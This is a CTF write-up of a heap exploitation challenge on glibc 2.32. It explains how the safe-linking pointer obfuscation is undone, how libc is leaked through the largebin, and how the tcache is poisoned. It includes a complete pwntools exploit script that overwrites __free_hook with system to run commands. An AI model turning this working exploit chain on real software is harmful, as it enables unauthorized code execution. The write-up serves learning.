## VulnCon CTF: name [pwn]
##### *tl;dr: bypassing the safe-linking mitigation on libc 2.32*

#### I didn't solve this during the ctf and only based my writeup from team zh3r0's. The given challenge binary had many vulnerabilities: allowed negative index access, heap overflow using gets, use after free. 

#### I focused on leveraging the use-after-free but was stuck on poisoning the tcache entries since the address I poisoned was off. This is the point where I learned about the safe-linking hardening of the 2.32 libc, where it obfuscates the "next" entry in singly-linked list bins. Since the operation used was only shifts and xor, it can be easily reversed and we only need to obfuscate the poison entry so that when it gets deobfuscated we get the address that we need.

#### Another thing I was also able to learn was the technique used in leaking a libc address. First we need to allocate a chunk that is unserviceable by tcache then free it so that it gets stored in the unsorted bin. Since the main arena address in the unsorted bin has a null byte, we can't print it out. Next step is to allocate a larger chunk than the previous one, so that the previous chunk gets transferred to the largebin where it gets a non-null starting libc address and only then could we leak it. Exploit script below will add more detail later

```python
from pwn import *

#: CONNECT TO SERVERS
binary = ELF('./heap', checksec = False)
libc = ELF('./libc.so.6', checksec = False)

p = process('./heap', env = {'LD_PRELOAD' : './libc.so.6'})
print(p.recvuntil('exit\n'))

#: GDB SETTINGS
breakpoints = ['brva 0x14ad', 'brva 0x153f', 'brva 0x15d4']
#gdb.attach(p, gdbscript = '\n'.join(breakpoints))

#: EXPLOIT INTERACTION STUFF
def alloc_chunk(index, size, data):

	p.sendline('1')
	p.sendline(str(index))
	p.sendline(str(size))
	p.sendline(data)
	print(p.recvuntil('exit\n'))

def edit_chunk(index, data):

	p.sendline('2')
	p.sendline(str(index))
	p.sendline(data)
	print(p.recvuntil('exit\n'))

def show_chunk(index):

	p.sendline('3')
	p.sendline(str(index))
	print(p.recvuntil('exit\n'))

def free_chunk(index):

	p.sendline('4')
	p.sendline(str(index))
	print(p.recvuntil('exit\n'))

def deobfuscate(pointer, arch = 64):

	p = 0
	
	for i in range(arch * 4, 0, -4): # 16 nibble
		v1 = (pointer & (0xf << i )) >> i
		v2 = (p & (0xf << i+12 )) >> i+12
		p |= (v1 ^ v2) << i
	
	return p

def obfuscate(heap_base,target):
	
	return (heap_base >> 0xc ) ^ target

#: PWN THY VULNS
alloc_chunk(0, 0x420, 'A' * 0x420)
alloc_chunk(1, 0x20, 'B' * 0x20) #: JUST TO AVOID CONSOLIDATION

free_chunk(0) #: SEND CHUNK TO UNSORTED BIN

alloc_chunk(2, 0x520, 'X' * 0x520) #: CREATE CHUNK LARGER THAN THE PREV FREED SO THAT IT GOES INTO THE LARGEBIN AND HAVE A NON-NULL ADDRESS

p.sendline('3') #: PRINT INDEX 0 WHICH IS AT LARGEBIN
p.sendline('0')

leak = u64(p.recvuntil('exit\n').split()[1].ljust(8, '\x00'))
libc_base = leak - 0x1e3ff0

print(hex(leak))
print(hex(libc_base))

#: LEAK HEAP BASE TO DEOBFUSCATE SAFE LINKING
#: SAFE LINKING BASICALLY OBFUSCATES THE NEXT POINTER ON A SINGLY-LINKED LIST
alloc_chunk(3, 0x20, 'C' * 0x20)
free_chunk(3)
free_chunk(1)

p.sendline('3') #: PRINT INDEX 0 WHICH IS AT LARGEBIN
p.sendline('1') #: CHUNK 1'S FD POINTER POINTS TO THE OBFUSCATED ADDR OF CHUNK 3
heap_obfuscated = u64(p.recvuntil('exit\n').split()[1].ljust(8, '\x00'))
heap_base = deobfuscate(heap_obfuscated) - 0x2c0
print(hex(heap_obfuscated))
print(hex(heap_base))

#: TIME TO TCACHE POISON
edit_chunk(1, p64(obfuscate(heap_base, libc_base + libc.symbols['__free_hook'])))
alloc_chunk(4, 0x20, 'cat exploit_template.py')
alloc_chunk(5, 0x20, p64(libc_base + libc.symbols['system']))
free_chunk(4)
p.interactive()

#: REFERENCES
#: https://fascinating-confusion.io/posts/2020/11/csr20-howtoheap-writeup/
```